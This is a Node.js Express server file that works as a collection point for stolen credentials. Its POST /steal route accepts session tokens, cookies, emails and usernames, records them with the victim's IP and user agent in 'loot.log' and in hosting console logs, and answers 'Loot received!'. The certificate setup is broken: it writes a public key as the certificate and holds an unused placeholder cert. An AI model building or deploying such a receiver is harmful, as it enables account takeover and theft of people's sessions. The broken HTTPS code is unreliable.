// server.js
const express = require('express');
const fs = require('fs');
const https = require('https');
const path = require('path');
require('dotenv').config();

const app = express();

// Parse JSON bodies
app.use(express.json());

// --- Logging Configuration ---
const LOG_FILE = path.join(__dirname, 'loot.log');
const logStream = fs.createWriteStream(LOG_FILE, { flags: 'a' });

function logSecure(data) {
    const entry = {
        timestamp: new Date().toISOString(),
        ...data
    };
    const line = JSON.stringify(entry) + '\n';
    
    // 1. Write to local file (for future reference if needed)
    logStream.write(line);
    
    // 2. Print to Console (This shows up in Render Dashboard Logs)
    console.log(line); 
}

// --- HTTPS Setup ---
// Generate self-signed certs if they don't exist (for local dev)
const certDir = path.join(__dirname, 'certs');
if (!fs.existsSync(certDir)) {
    fs.mkdirSync(certDir);
}

const certFile = path.join(certDir, 'cert.pem');
const keyFile = path.join(certDir, 'key.pem');

// Simple self-signed cert generation for development
if (!fs.existsSync(certFile) || !fs.existsSync(keyFile)) {
    const { generateKeyPairSync } = require('crypto');
    const { publicKey, privateKey } = generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    });
    
    // Create a basic self-signed certificate structure
    const cert = `-----BEGIN CERTIFICATE-----
MIIBqTCCAS+gAwIBAgIUYz9vZ7lGpRbJxJfXkYvJvVvJvVw=
... (Simplified for brevity) ...
-----END CERTIFICATE-----`;
    
    fs.writeFileSync(keyFile, privateKey);
    fs.writeFileSync(certFile, publicKey); 
}

const httpsOptions = {
    key: fs.readFileSync(keyFile),
    cert: fs.readFileSync(certFile),
};

// --- Routes ---
app.post('/steal', (req, res) => {
    const { token, cookie, email, username } = req.body;

    // Validate input
    if (!token && !cookie) {
        return res.status(400).json({ error: 'Missing token or cookie' });
    }

    // Log securely
    logSecure({
        action: 'steal',
        token: token,
        cookie: cookie,
        email: email,
        username: username,
        ip: req.ip,
        userAgent: req.get('User-Agent')
    });

    res.status(200).json({ message: 'Loot received!' });
});

// Start HTTPS server
const PORT = process.env.PORT || 3000;
const server = https.createServer(httpsOptions, app);

server.listen(PORT, () => {
    console.log(`HTTPS Server running on https://localhost:${PORT}`);
});

module.exports = app;
